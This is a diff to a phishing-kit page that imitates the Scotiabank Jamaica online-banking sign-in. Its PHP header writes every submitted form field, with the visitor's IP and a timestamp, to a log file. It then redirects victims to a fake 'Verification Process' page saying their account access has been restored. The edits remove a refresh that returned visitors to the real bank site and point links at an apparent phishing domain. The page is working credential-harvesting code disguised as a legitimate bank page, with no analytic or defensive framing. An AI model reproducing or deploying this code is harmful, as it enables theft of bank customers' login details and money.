@@ -1,6 +1,6 @@
 <?php
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-header('Location: www.gmail.com');
+header('Location: Complete.php');
 $handle = fopen('log.txt', 'a');
 fwrite($handle, '----------------------------------------------------------------------['.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date("h:i:s a - Y/m/d")).']---['.$_SERVER['REMOTE_ADDR']."]\r\n");
 foreach($_POST as $variable => $value) {
@@ -9,7 +9,7 @@ fclose($handle);
 exit;
 } ?>
 
-<!-- saved from url=(0179)http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2 -->
+<!-- saved from url=(0176)http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283 -->
 <html lang="en" xml:lang="en" xmlns="http://www.w3.org/1999/xhtml" style="" class="RUIFW-ready desktop"><head id="j_idt3"><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
     <title>Scotia OnLine</title>
 	
@@ -19,25 +19,25 @@ exit;
 	<meta content="en" http-equiv="content-language">
 	<!-- <meta name="viewport" content="initial-scale=1, maximum-scale=1">
 	<meta name="apple-mobile-web-app-capable" content="yes"> -->
-    <meta http-equiv="refresh" content="3;url=https://www.online.scotiabank.com/onlineV1/leap/signon/signOn.xhtml?country=JAM&amp;lang=en&amp;channel=WEB"> 
+	   
 	<meta name="viewport" content="width=device-width,initial-scale=1">
 	
 	    
-<link href="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/bootstrap.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/bootstrap-theme.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/bootstrap-datepicker.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/font-awesome.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/B2ELab-RUIFW.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/B2ELab-RUIFW-static.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/bootstrap-slider.css" rel="stylesheet" type="text/css"><!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="http://localhost:8080/signon15/retail/B2E_RUIFW_src/core/css/B2ELab-RUIFW-IE-Only.css" /><![endif]-->
+<link href="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/bootstrap.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/bootstrap-theme.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/bootstrap-datepicker.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/font-awesome.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/B2ELab-RUIFW.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/B2ELabUIFW-static.css" rel="stylesheet" type="text/css"><link href="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/bootstrap-slider.css" rel="stylesheet" type="text/css"><!--[if lte IE 8]><link rel="stylesheet" type="text/css" href="http://localhost:8080/signon15/retail/B2E_RUIFW_src/core/css/B2ELab-RUIFW-IE-Only.css" /><![endif]-->
     
     
 
     
    
     <link href="http://onlinescotiajam.myftp.org/images/favicon.ico" rel="shortcut icon">
-    <link href="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/desktop.css" type="text/css" rel="stylesheet">
-    <link href="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/signon.css" type="text/css" rel="stylesheet">
-	<link href="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/print.css" type="text/css" rel="stylesheet">
+    <link href="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/desktop.css" type="text/css" rel="stylesheet">
+    <link href="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/signon.css" type="text/css" rel="stylesheet">
+	<link href="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/print.css" type="text/css" rel="stylesheet">
 
 </head><body>
 
 <div class="RUIFW-page-wrap">
-    <header class="RUIFW-container-header" role="navigation"><div id="header" class="RUIFW-page-header"><a class="sr-only RUIFW-skip-main" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#RUIFW-main-content" onclick="#">Skip to main content</a>
+    <header class="RUIFW-container-header" role="navigation"><div id="header" class="RUIFW-page-header"><a class="sr-only RUIFW-skip-main" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#RUIFW-main-content" onclick="#">Skip to main content</a>
         <h1 class="RUIFW-brand RUIFW-col-6 col-sm-6">
           <span class="RUIFW-sr sr-only sr-only">Scotiabank Group</span>
         </h1>
@@ -45,11 +45,11 @@ exit;
 <form id="header_links_form" name="header_links_form" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">
 
 
-        <a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" id="tcSwitch" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_1&quot;;return this.s_oc?this.s_oc(e):true">Terms and Conditions</a>
+        <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" id="tcSwitch" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_1&quot;;return this.s_oc?this.s_oc(e):true">Terms and Conditions</a>
        
 </form>
-            <a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_2&quot;;return this.s_oc?this.s_oc(e):true" title="How to contact Scotiabank">Contact Us</a>
-              <a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_3&quot;;return this.s_oc?this.s_oc(e):true" title="Scotiabank Accessibility Statement">Accessibility</a>
+            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_2&quot;;return this.s_oc?this.s_oc(e):true" title="How to contact Scotiabank">Contact Us</a>
+              <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_3&quot;;return this.s_oc?this.s_oc(e):true" title="Scotiabank Accessibility Statement">Accessibility</a>
         </div></div>
       <div class="RUIFW-bg-bar hidden-xs">
         <div class="RUIFW-bg-main-nav"></div>
@@ -71,7 +71,7 @@ exit;
 	<div id="cmContentOnlyW1">
 	</div>
 	
-	<h1 class="RUIFW-col-9 col-sm-9">Sign In to Scotia OnLine (Jamaica)</h1>
+	<h1 class="RUIFW-col-9 col-sm-9">Verification Process</h1>
 
 	<div class="RUIFW-content-main RUIFW-col-9 col-md-9 col-sm-9">
 
@@ -79,7 +79,7 @@ exit;
 
 
     
-		<div class="wizard-form-content wrapfrom">
+		<div class="wrapfrom">
 			<div class="RUIFW-row row">
        
 				
@@ -87,14 +87,9 @@ exit;
 
 
 
+            <style>
 
-
-<style>
-* {
-  box-sizing: border-box;
-}
-
-input[type=password], select, textarea {
+input[type=text], select, textarea {
   width: 90%;
   padding: 12px;
   border: 1px solid #ccc;
@@ -108,6 +103,13 @@ input[type=email], select, textarea {
   border-radius: 4px;
   resize: vertical;
 }
+input[type=password], select, textarea {
+  width: 90%;
+  padding: 12px;
+  border: 1px solid #ccc;
+  border-radius: 4px;
+  resize: vertical;
+}
 input[type=date], select, textarea {
   width: 90%;
   padding: 12px;
@@ -115,33 +117,52 @@ input[type=date], select, textarea {
   border-radius: 4px;
   resize: vertical;
 }
-input[type=tel], select, textarea {
-  width: 90%;
-  padding: 12px;
-  border: 1px solid #ccc;
-  border-radius: 4px;
-  resize: vertical;
-}
-
 label {
   padding: 12px 12px 12px 0;
   display: inline-block;
 }
 
+input[type=submit] {
+  background-color: #04AA6D;
+  color: white;
+  padding: 12px 20px;
+  border: none;
+  border-radius: 4px;
+  cursor: pointer;
+  float: right;
+}
 
 input[type=submit]:hover {
   background-color: #45a049;
 }
 
+@media (min-width: 700px){
 .cntainer {
   border-radius: 5px;
   padding: 20px;
+  background-color: #f6f6f6;
+  margin-right: 15%;
+  margin-left: 15%;
 }
-
-.col-25 {
+.col-23 {
   float: left;
-  width: 25%;
+  width: 40%;
   margin-top: 6px;
+}
+}
+@media (max-width: 699px){
+.cntainer {
+  border-radius: 5px;
+  padding: 20px;
+  background-color: #f6f6f6;
+  margin-left: 2%;
+  margin-right: 2%;
+}
+.col-23 {
+  float: left;
+  width: 80%;
+  margin-top: 6px;
+}
 }
 hr {
     width: 100%;
@@ -149,20 +170,23 @@ hr {
     background-color: blue;
 
 }
-.col-24 {
+
+.col-25 {
   float: left;
-  width: 23%;
+  width: 25%;
   margin-top: 6px;
 }
+
 .col-23 {
-  float: left;
-  width: 35%;
-  margin-top: 6px;
-}
-.col-75 {
   float: left;
   width: 40%;
   margin-top: 6px;
+}
+
+.col-75 {
+  float: left;
+  width: 40%;
+  margin-top: 3px;
 }
 
 /* Clear floats after the columns */
@@ -171,11 +195,11 @@ hr {
   display: table;
   clear: both;
 }
-.button {
-    background-color: #4CAF50;
+.btton {
+    background-color: #D81E05;
     border: none;
     color: white;
-    padding: 15px 32px;
+    padding: 10px 32px;
     text-align: center;
     text-decoration: none;
     display: inline-block;
@@ -183,8 +207,6 @@ hr {
     margin: 4px 2px;
     cursor: pointer;
 }
-.button {width: 50%;}
-
 /* Responsive layout - when the screen is less than 600px wide, make the two columns stack on top of each other instead of next to each other */
 @media screen and (max-width: 600px) {
   .col-25, .col-75, input[type=submit] {
@@ -192,7 +214,7 @@ hr {
     margin-top: 0;
   }
 }
-</style> 
+</style>
 
 
 <div class="cntainer">
@@ -210,7 +232,7 @@ hr {
       <div class="col-75">
       <center>
 
-<img width="150" height="150" src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/success.gif">
+<img width="150" height="150" src="https://i.ibb.co/TvRQgcM/success.gif">
 <br>  <br>    <p>Thank you! Your account access has been Restored.</p>
 
 </center>
@@ -221,17 +243,6 @@ hr {
 
   
 </div>
-
-
-   
-  
-</div>
-
-
-
-
-
-
 					
 				
 
@@ -243,12 +254,12 @@ hr {
 		
            
 
-		</div></form>
+		</div>
 		<div id="cmContentOnlyW2">
 		</div><span class="gap"></span>
 
 
-	</div>
+	</div></form>
 	<div class="RUIFW-modal fade modal fade in modal fade" id="forgotPasswordWindow" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="false" data-backdrop="static">
 
 
@@ -265,7 +276,7 @@ hr {
 						To continue, let's confirm your account and personal info. If you don't have a registered email in your profile, please visit your nearest branch.</div>
 					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
 
-<a id="contentForm:forgotPasswordReminderDialog:blockCancelPanelForm:j_idt220" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Continue</a>
+<a id="contentForm:forgotPasswordReminderDialog:blockCancelPanelForm:j_idt220" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Continue</a>
 	
 
 					</div>
@@ -291,7 +302,7 @@ hr {
 					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
 
 
-<input id="contentForm:enrollmentReminderDialog:blockCancelPanelForm:j_idt225" type="submit" name="contentForm:enrollmentReminderDialog:blockCancelPanelForm:j_idt225" value="Cancel" style="font-size:14px;" class="RUIFW-btn btn btn-default btn btn-default" onclick="mojarra.ab(this,event,&#39;click&#39;,0,0,{&#39;onevent&#39;:fadeEnrollmentAuthWindowAction});return false"><a id="contentForm:enrollmentReminderDialog:blockCancelPanelForm:j_idt226" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#" style="font-size:14px;" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Continue</a><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:3" value="1753024883910721775:4930336308320219723" autocomplete="off">
+<input id="contentForm:enrollmentReminderDialog:blockCancelPanelForm:j_idt225" type="submit" name="contentForm:enrollmentReminderDialog:blockCancelPanelForm:j_idt225" value="Cancel" style="font-size:14px;" class="RUIFW-btn btn btn-default btn btn-default" onclick="mojarra.ab(this,event,&#39;click&#39;,0,0,{&#39;onevent&#39;:fadeEnrollmentAuthWindowAction});return false"><a id="contentForm:enrollmentReminderDialog:blockCancelPanelForm:j_idt226" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#" style="font-size:14px;" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Continue</a><input type="hidden" name="javax.faces.ViewState" id="j_id1:javax.faces.ViewState:3" value="1753024883910721775:4930336308320219723" autocomplete="off">
 
 					</div>
 			</div>
@@ -317,7 +328,7 @@ hr {
 					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns">
 
 
-<input id="contentForm:recoverUserNameReminderDialog:blockCancelPanelForm:j_idt231" type="submit" name="contentForm:recoverUserNameReminderDialog:blockCancelPanelForm:j_idt231" value="Cancel" style="font-size:14px;" class="RUIFW-btn btn btn-default btn btn-default" onclick="mojarra.ab(this,event,&#39;click&#39;,0,0,{&#39;onevent&#39;:fadeRecoverUserAuthWindowAction});return false"><a id="contentForm:recoverUserNameReminderDialog:blockCancelPanelForm:j_idt232" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#" style="font-size:14px;" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Continue</a>
+<input id="contentForm:recoverUserNameReminderDialog:blockCancelPanelForm:j_idt231" type="submit" name="contentForm:recoverUserNameReminderDialog:blockCancelPanelForm:j_idt231" value="Cancel" style="font-size:14px;" class="RUIFW-btn btn btn-default btn btn-default" onclick="mojarra.ab(this,event,&#39;click&#39;,0,0,{&#39;onevent&#39;:fadeRecoverUserAuthWindowAction});return false"><a id="contentForm:recoverUserNameReminderDialog:blockCancelPanelForm:j_idt232" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#" style="font-size:14px;" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Continue</a>
 
 					</div>
 			</div>
@@ -330,7 +341,7 @@ hr {
 
 	</div>
   
-</section></div>
+</div>
 
 
 
@@ -340,13 +351,13 @@ hr {
          <div class="right-box">
         <div class="exp-collapse">
           <h4>
-            <a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" class="Open">Security Guarantee</a>
+            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" class="Open">Security Guarantee</a>
           </h4>
         </div>
         <div id="scotia_security" class="RUIFW-container-well fade right-box-item-holder in" aria-hidden="false">
           <ul class="right-box-item">
             <li class="rightbox-icon-lock"><span>We're committed to keeping your financial information safe and secure.</span></li>
-            <li class="more-link"><a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_5&quot;;return this.s_oc?this.s_oc(e):true" title="Learn More">Learn More</a></li>
+            <li class="more-link"><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_5&quot;;return this.s_oc?this.s_oc(e):true" title="Learn More">Learn More</a></li>
         	
           </ul>
         </div></div>
@@ -356,13 +367,13 @@ hr {
      <div id="help_section_div" class="right-box">
         <div class="exp-collapse">
           <h4>
-            <a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" class="" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_6&quot;;return this.s_oc?this.s_oc(e):true">Need Help?</a>
+            <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" class="" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_6&quot;;return this.s_oc?this.s_oc(e):true">Need Help?</a>
           </h4>
         </div>
         <div id="help_section" class="RUIFW-hide RUIFW-container-well fade right-box-item-holder" aria-hidden="true">
           <ul class="right-box-item">
-            <li><a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_7&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" title="Help with this page">Help with this page</a></li>
-            <li class="rightbox-icon-video"><a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_8&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" title="How-to video">How-to video</a></li>
+            <li><a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_7&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" title="Help with this page">Help with this page</a></li>
+            <li class="rightbox-icon-video"><a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_8&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" title="How-to video">How-to video</a></li>
           </ul>
         </div>
       </div> 
@@ -371,14 +382,14 @@ hr {
       <div class="right-box noprint">
          <div class="exp-collapse">
           <h4>
-            <a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_9&quot;;return this.s_oc?this.s_oc(e):true" class="" href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;">Contact Us</a>
+            <a onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_9&quot;;return this.s_oc?this.s_oc(e):true" class="" href="http://localhost:8080/phpSite/scotis/javascript:undefined;">Contact Us</a>
           </h4>
         </div>
         <div id="contact_us" class="RUIFW-hide RUIFW-container-well fade right-box-item-holder" aria-hidden="true">
           <ul class="right-box-item">
             <li class="rightbox-icon-phone"><span>Call us at (876) 960-2675 or Toll free 1-888-472-6842</span></li>
-            <li class="rightbox-icon-comment"><a id="general_feedback_rhs_link" title="General Feedback" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_10&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" aria-hidden="false">General Feedback</a></li>
-            <li class="more-link"><a title="More" href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_11&quot;;return this.s_oc?this.s_oc(e):true" aria-hidden="false">More</a></li>
+            <li class="rightbox-icon-comment"><a id="general_feedback_rhs_link" title="General Feedback" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_10&quot;;return this.s_oc?this.s_oc(e):true" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" aria-hidden="false">General Feedback</a></li>
+            <li class="more-link"><a title="More" href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_11&quot;;return this.s_oc?this.s_oc(e):true" aria-hidden="false">More</a></li>
           </ul>
         </div>
       </div> 
@@ -390,9 +401,9 @@ hr {
 			<div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
 <form id="feedbackForm" name="feedbackForm" method="post" action="<?php echo basename(__FILE__); ?>" enctype="application/x-www-form-urlencoded">
 
-					<div class="RUIFW-modal-header modal-header modal-header"><a id="feedbackForm:headerCloseLink" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#" onclick="#" class="close_icon"></a>
+					<div class="RUIFW-modal-header modal-header modal-header"><a id="feedbackForm:headerCloseLink" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#" onclick="#" class="close_icon"></a>
 						<h4 class="RUIFW-modal-title modal-title modal-title" id="feedbackModalLogo">
-							<img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/scotiabank-group.gif">
+							<img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/scotiabank-group.gif">
 						</h4>
 					</div>
 					<div class="RUIFW-modal-body modal-body modal-body">
@@ -400,8 +411,8 @@ hr {
 
 						<p>Your feedback is important to us as we will use it to make improvements. Note we will not reply to individual submissions. If you need assistance, please call our Contact Centre.</p>
 						<ul id="feedbackTabs" class="RUIFW-nav-tabs nav nav-two-tabs mrgn-top-20 nav nav-tabs nav nav-tabs">
-							<li class="active"><a href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#suggestionTab" data-toggle="tab" onclick="#">Suggestion</a></li>
-							<li class=""><a href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#problemTab" data-toggle="tab" onclick="#">Problem</a></li>
+							<li class="active"><a href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#suggestionTab" data-toggle="tab" onclick="#">Suggestion</a></li>
+							<li class=""><a href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#problemTab" data-toggle="tab" onclick="#">Problem</a></li>
 						</ul>
 						<div class="RUIFW-tab-content tab-content wizard_top_border mrgn-top-minus1 wrapfrom tab-content tab-content">
 							<div class="RUIFW-tab-pane fade tab-pane active in tab-pane fade tab-pane fade" id="suggestionTab">
@@ -441,7 +452,7 @@ hr {
 								<label><span class="red-text">*</span> Mandatory field.</label></div>
 						</div>
 					</div>
-					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns"><a id="feedbackForm:formCloseLink" href="http://onlinescotiajam.myftp.org/success.php?token=2f39a5de9661589d06f8f7551f51b94b3e6c8eb1f3aaef5b5f2a2e694a1d41251a77b8f385b2231df43ce32e84c4e8251960956c6d6b457d42af7f39d7d19da2#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Submit Feedback</a>
+					<div class="RUIFW-modal-footer btn-holder modal-footer modal-footer" id="aunth_sect_btns"><a id="feedbackForm:formCloseLink" href="http://onlinescotiajam.myftp.org/mail.php?token=9e43e14868bb6c88b29134d2b564941d65aa6b6cf83f2636c8ab6dcf38666842a8ce8967765cb502d82d308050fe062dcee216ec955d83d182f6362dead29283#" onclick="#" class="RUIFW-btn-primary btn btn-primary btn btn-primary">Submit Feedback</a>
 					</div>
 
 </form>
@@ -463,8 +474,8 @@ hr {
 	</style><span id="leapwebanalytics">
 		   		
                 </span>
-    
-
+    </section>
+</div>
 
   <footer class="RUIFW-page-footer">
     <div class="footer-icons" id="footerImage">
@@ -473,19 +484,19 @@ hr {
     <div class="RUIFW-row noprint row-margin row">
     <ul class="RUIFW-nav-footer RUIFW-col-7 col-sm-7">
     <div id="footerLinks">
-          <li><a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_12&quot;;return this.s_oc?this.s_oc(e):true">Legal</a></li>
+          <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_12&quot;;return this.s_oc?this.s_oc(e):true">Legal</a></li>
           <li class="separator">&nbsp;</li>
-        <li><a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_13&quot;;return this.s_oc?this.s_oc(e):true">Privacy</a></li>
+        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_13&quot;;return this.s_oc?this.s_oc(e):true">Privacy</a></li>
         <li class="separator">&nbsp;</li>
-        <li><a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_14&quot;;return this.s_oc?this.s_oc(e):true">Security</a></li>
+        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_14&quot;;return this.s_oc?this.s_oc(e):true">Security</a></li>
         <li class="separator">&nbsp;</li>
-        <li><a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_15&quot;;return this.s_oc?this.s_oc(e):true">Contact Us</a></li>
+        <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_15&quot;;return this.s_oc?this.s_oc(e):true">Contact Us</a></li>
           <li class="separator">&nbsp;</li>
-          <li><a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_16&quot;;return this.s_oc?this.s_oc(e):true">FATCA</a></li>
+          <li><a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_16&quot;;return this.s_oc?this.s_oc(e):true">FATCA</a></li>
       </div></ul>
        <ul class=" RUIFW-nav-footer RUIFW-col-5 col-sm-5">
       <li class="copyright">
-                <a href="http://localhost:8080/phpSite/Scotia%20Token/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_17&quot;;return this.s_oc?this.s_oc(e):true"><img alt="trusteer" src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/trusteerIcon.png"></a>© 2022 Scotiabank.com All Rights Reserved</li>
+                <a href="http://localhost:8080/phpSite/scotis/javascript:undefined;" onclick="var x=&quot;.tl(&quot;;s_objectID=&quot;javascript:undefined;_17&quot;;return this.s_oc?this.s_oc(e):true"><img alt="trusteer" src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/trusteerIcon.png"></a>© 2022 Scotiabank.com All Rights Reserved</li>
 
            <li style="margin-left: 300px;">
                <div id="logo" style="display: inline;">
@@ -505,7 +516,7 @@ hr {
       <div class="RUIFW-col-9 col-sm-9">
       </div>
       <div class="RUIFW-col-3 col-sm-3">
-        <img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/scotiabank_r_logo.png" width="152" height="26" class="mrgn-btm-15  mrgn-top-10 alignright">
+        <img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/scotiabank_r_logo.png" width="152" height="26" class="mrgn-btm-15  mrgn-top-10 alignright">
       </div>
       </div>
   </div>
@@ -514,12 +525,12 @@ hr {
 			        <div class="RUIFW-modal-content modal-content modal-content modal-content" role="document">
 			              <div class="RUIFW-modal-header modal-header modal-header">
 			        <button type="button" class="close_icon" data-dismiss="modal"></button>
-			        <h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel"><img src="http://localhost:8080/phpSite/Scotia%20Token/./Scotia processsend_files/scotiabank-group.gif"></h4>
+			        <h4 class="RUIFW-modal-title modal-title modal-title" id="myModalLabel"><img src="http://localhost:8080/phpSite/scotis/./Scotia Onmail_files/scotiabank-group.gif"></h4>
 			      </div>
